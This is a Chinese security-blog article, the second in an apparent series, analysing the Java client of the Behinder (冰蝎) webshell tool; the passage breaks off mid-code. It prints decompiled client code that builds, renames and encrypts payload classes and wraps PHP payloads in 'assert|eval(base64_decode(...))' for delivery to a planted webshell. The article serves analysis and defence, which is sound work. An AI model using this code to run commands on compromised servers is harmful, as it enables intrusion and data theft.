---
title: 冰蝎（二）Java客户端实现
url: https://www.secpulse.com/archives/190863.html
source: 安全脉搏
date: 2022-11-12
fetch_date: 2025-10-03T22:29:32.486989
---

# 冰蝎（二）Java客户端实现

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# 冰蝎（二）Java客户端实现

[Web安全](https://www.secpulse.com/archives/category/articles/web)

[TideSec](https://www.secpulse.com/newpage/author?author_id=26366)
![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng0.png)

2022-11-11

15,179

# 前言

冰蝎解析（一）分析了Java服务端的具体实现，通过自定义类加载器ClassLoader.defineClass()实现将字节码加载至JVM中执行以达到执行任意Java代码的目的，那么接着上次的思路继续分析下冰蝎客户端的实现原理。

# 冰蝎Java客户端实现

利用jd-gui简单看下冰蝎的源码，其中net.rebeyond.behinder为其核心代码，其中core.ShellService.class为Webshell的操作类，负责调用其他类实现加解密、获取服务端基本信息、命令执行等；payload.java下class文件为Java服务端的具体实现，可以通过ASM框架可以修改其下class文件属性值生成可用payload字节数组；utils.Utils.class为通用操作的具体实现，如payload传输、接收返回结果并解析等。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190863-1668144612.png "null")

如上，我们简单了解了冰蝎大致的源码结构。通过一个获取服务端基础信息的过程，我们再来看下冰蝎客户端的具体实现过程。

## 获取BasicInfo.class 字节数组

ShellService.class中getBasicInfo方法，调用Utils.getData方法获取payload.java下对应BasicInfo.class的字节数组；调用Utils.requestAndParse()发送payload并解析返回值。

```
 public String getBasicInfo(String whatever) throws Exception {
    String result = "";
    Map<String, String> params = new LinkedHashMap<>();
    params.put("whatever", whatever);
     //获取BasicInfo.class 字节数据，其中包含此payload的解密与生成过程
    byte[] data = Utils.getData(this.currentKey, this.encryptType, "BasicInfo", params, this.currentType);
    //发送payload并解析返回结果
     Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
    byte[] resData = (byte[])resultObj.get("data");
    try {
      //解密返回结果
        result = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
    } catch (Exception e) {
      throw new Exception("+ new String(resData, "UTF-8"));
    }
    return result;
  }
```

跟进去到Utils.getData()，当传入的type参数为jsp时进入Params.getParamedClass()，获取对应className的字节数组，将其加密和编码处理并返回。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190863-1668144615.png "null")

```
 public static byte[] getData(String key, int encryptType, String className, Map<String, String> params, String type, byte[] extraData) throws Exception {
    if (type.equals("jsp")) {
      byte[] bincls = Params.getParamedClass(className, params);
      if (extraData != null)
        bincls = CipherUtils.mergeByteArray(new byte[][] { bincls, extraData });
      byte[] encrypedBincls = Crypt.Encrypt(bincls, key);
      String basedEncryBincls = Base64.encode(encrypedBincls);
      return basedEncryBincls.getBytes();
    }
    if (type.equals("php")) {
      byte[] bincls = Params.getParamedPhp(className, params);
      bincls = Base64.encode(bincls).getBytes();
      bincls = ("assert|eval(base64_decode('" + new String(bincls) + "'));").getBytes();
      if (extraData != null)
        bincls = CipherUtils.mergeByteArray(new byte[][] { bincls, extraData });
      byte[] encrypedBincls = Crypt.EncryptForPhp(bincls, key, encryptType);
      return Base64.encode(encrypedBincls).getBytes();
    }
    if (type.equals("aspx")) {
      byte[] bincls = Params.getParamedAssembly(className, params);
      if (extraData != null)
        bincls = CipherUtils.mergeByteArray(new byte[][] { bincls, extraData });
      byte[] encrypedBincls = Crypt.EncryptForCSharp(bincls, key);
      return encrypedBincls;
    }
    if (type.equals("asp")) {
      byte[] bincls = Params.getParamedAsp(className, params);
      if (extraData != null)
        bincls = CipherUtils.mergeByteArray(new byte[][] { bincls, extraData });
      byte[] encrypedBincls = Crypt.EncryptForAsp(bincls, key);
      return encrypedBincls;
    }
    return null;
  }

```

```
继续进入Params.getParamedClass(className, params)方法，通过ASM框架将clsName对应的class文件转化成字节数组并返回。
```

```
public static byte[] getParamedClass(String clsName, final Map<String, String> params) throws Exception {
    String clsPath = String.format("net/rebeyond/behinder/payload/java/%s.class", new Object[] { clsName });
    ClassReader classReader = new ClassReader(String.format("net.rebeyond.behinder.payload.java.%s", new Object[] { clsName }));
    ClassWriter cw = new ClassWriter(1);
    classReader.accept((ClassVisitor)new ClassAdapter((ClassVisitor)cw) {
          public FieldVisitor visitField(int arg0, String filedName, String arg2, String arg3, Object arg4) {
            if (params.containsKey(filedName)) {
              String paramValue = (String)params.get(filedName);
              return super.visitField(arg0, filedName, arg2, arg3, paramValue);
            }
            return super.visitField(arg0, filedName, arg2, arg3, arg4);
          }
        }0);
    byte[] result = cw.toByteArray();
    String oldClassName = String.format("net/rebeyond/behinder/payload/java/%s", new Object[] { clsName });
    if (!clsName.equals("LoadNativeLibrary")) {
      String newClassName = getRandomClassName(oldClassName);
      result = Utils.replaceBytes(result, Utils.mergeBytes(new byte[] { (byte)(oldClassName.length() + 2), 76 }, oldClassName.getBytes()), Utils.mergeBytes(new byte[] { (byte)(newClassName.length() + 2), 76 }, newClassName.getBytes()));
      result = Utils.replaceBytes(result, Utils.mergeBytes(new byte[] { (byte)oldClassName.length() }, oldClassName.getBytes()), Utils.mergeBytes(new byte[] { (byte)newClassName.length() }, newClassName.getBytes()));
    }
    result[7] = 50;
    return result;
  }
```

## BasicInfo.class的具体实现

以上完成了对应payload.java.BasicInfo.class的字节数组生成与加密过程，看下BasicInfo的具体实现。BaisicInfo.class中重写了equals方法，在此方法中完成了response、response、seesion对象的获取；服务端基本信息的获取、加密；结果的返回和解析。

```
public boolean equals(Object obj) {
    String result = "";
    try {
        //获取response、response、seesion对象
      fillContext(obj);
        //获取服务端基本信息
      StringBuilder basicInfo = new StringBuilder("<br/><font size=2 color=red>环境变量<...